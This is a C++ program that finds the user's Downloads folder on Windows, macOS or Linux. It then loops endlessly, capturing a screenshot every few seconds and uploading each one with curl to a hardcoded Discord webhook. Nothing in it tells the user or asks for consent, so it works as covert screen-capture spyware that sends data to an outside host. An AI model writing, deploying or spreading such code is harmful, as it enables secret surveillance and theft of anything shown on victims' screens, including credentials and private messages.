#include <cstdlib>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>       // For std::remove
#include <sys/stat.h>   // for stat

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>       
#include <combaseapi.h>   
#include <objbase.h>      
#elif __APPLE__
#include <unistd.h>
#elif __linux__
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#endif

std::string getDownloadsPath() {
#ifdef _WIN32
    if (FAILED(CoInitialize(NULL))) {
        char* userProfile = getenv("USERPROFILE");
        return userProfile ? std::string(userProfile) + "\\Downloads" : "C:\\Users\\Public\\Downloads";
    }

    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &path);
    std::string result;

    if (SUCCEEDED(hr) && path != nullptr) {
        char buffer[MAX_PATH];
        wcstombs(buffer, path, MAX_PATH);
        result = std::string(buffer);
        CoTaskMemFree(path);
    } else {
        char* userProfile = getenv("USERPROFILE");
        result = userProfile ? std::string(userProfile) + "\\Downloads" : "C:\\Users\\Public\\Downloads";
    }

    CoUninitialize();
    return result;

#elif __APPLE__
    const char* home = getenv("HOME");
    if (home)
        return std::string(home) + "/Downloads";
    else
        return "/Users/Shared/Downloads";
#elif __linux__
    const char* home = getenv("HOME");
    if (!home) {
        struct passwd* pwd = getpwuid(getuid());
        home = pwd ? pwd->pw_dir : "/tmp";
    }
    return std::string(home) + "/Downloads";
#else
    return "./";
#endif
}

void takeScreenshot(const std::string& filepath) {
#ifdef _WIN32
    std::string command = "nircmd.exe savescreenshot \"" + filepath + "\"";
#elif __APPLE__
    std::string command = "screencapture \"" + filepath + "\"";
#elif __linux__
    std::string command = "scrot \"" + filepath + "\"";
#else
    std::string command = "echo Unsupported platform";
#endif
    system(command.c_str());
}

void sendToWebhook(const std::string& filepath, const std::string& webhookUrl) {
    std::string command = "curl -F \"file=@" + filepath + "\" " + webhookUrl;
    system(command.c_str());
}

int main() {
    std::string downloads = getDownloadsPath();

    std::string webhook = "https://discord.com/api/webhooks/1374041380439199745/ZIWLcvoeNFRFUdmlAuMzIi6gQ4XXy12jv528E7TBKpvolPeYTnIo4otO-9lIDruHSz-4";

    std::string filename = downloads + (
        downloads.back() == '/' || downloads.back() == '\\' ? "" :
        #ifdef _WIN32
        "\\"
        #else
        "/"
        #endif
    ) + "screenshot.png";

    while (true) {
        // Delete the existing screenshot file if it exists
        std::remove(filename.c_str());

        // Take a new screenshot
        takeScreenshot(filename);

        // Small delay to ensure file write completes
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Send the screenshot to the webhook
        sendToWebhook(filename, webhook);

        // Wait 2 seconds before next screenshot
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    return 0;
}
